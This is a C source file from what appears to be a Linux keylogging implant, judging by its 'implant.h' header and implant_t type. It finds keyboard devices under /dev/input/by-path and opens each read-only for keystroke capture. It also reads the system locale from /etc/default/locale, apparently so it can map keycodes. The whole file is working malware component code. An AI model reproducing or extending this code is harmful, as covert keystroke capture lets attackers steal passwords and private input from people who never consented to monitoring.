
/*
    keyboard handling and local support.
*/


#include "implant.h"

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>


static int is_kbd(const struct dirent *f) {
    size_t len = strlen(f->d_name);

    if (len < 3)
        return 0;

    return f->d_name[len - 3] == 'k' && f->d_name[len - 2] == 'b' && f->d_name[len - 1] == 'd';
}


void fetch_available_keyboards(implant_t *instance) {

    /*
        input devices usually live in /dev/input/

        you can identify the in the by-path subdirectory, which maps each
        device name to a symlink

        here, we will return set an array of file-descriptor for each available
        keyboard on the machine, it should be appended with a -1 that should serve
        as a NULL value
    */

    struct dirent **char_devices = NULL;
    int possible_paths = scandir(
        "/dev/input/by-path/",
        &char_devices,
        &is_kbd,
        &alphasort
    );

    if (possible_paths == -1 || chdir("/dev/input/by-path/") < 0) {
        DEBUG_LOG(
            instance->debug_enabled,
            "could not find possible keyboard paths"
        );

        return;
    }

    instance->kb_fd = malloc(sizeof(int) * ((size_t)possible_paths + 1));
    if (!instance->kb_fd) {
        DEBUG_LOG(
            instance->debug_enabled,
            "could not allocate memory for possible kb paths: %s",
            strerror(errno)
        );
        return;
    }

    instance->kb_fd[possible_paths] = -1;
    char rpath[2048] = {0};
    for (int ctr = -1; ++ctr < possible_paths;) {
        if (!realpath(char_devices[ctr]->d_name, rpath)) {
            DEBUG_LOG(
                instance->debug_enabled,
                "[!] Could not run realpath(%s): %s",
                char_devices[ctr]->d_name, strerror(errno)
            );
        } else instance->kb_fd[ctr] = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
    }

      for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);
}


static int parse_locale(char const *locale_fpath, implant_t *instance) {

    char *buffer = NULL;
    if (ERROR == read_file(locale_fpath, &buffer, instance))
        return ERROR;

    char **tab = tabgen(buffer, '\n');
    if (!tab) {
        DEBUG_LOG(
            instance->debug_enabled,
            "Could not split buffer contents: %s",
            buffer
        );

        free(buffer);
        return ERROR;
    }

    for (size_t i = 0; i < get_array_size((uint8_t **)tab); i++) {

        if (!strncmp(tab[i], "LANG=", 5)) {
            strncpy(instance->locale, tab[i] + 5, 20);

            /* safe to free all this and exit this function */
            free_tab((uint8_t **)tab);
            free(buffer);
            return SUCCESSFUL;
        }
    }

    DEBUG_LOG(instance->debug_enabled, "\n[!] Could not retrieve locale from %s", buffer);
    free_tab((uint8_t **)tab);
    free(buffer);
    return ERROR;
}


int get_locale(implant_t *instance) {

    /*
        function call is wrapped in order to support multiple distros
        down the line.
    */

    return parse_locale("/etc/default/locale", instance);
}
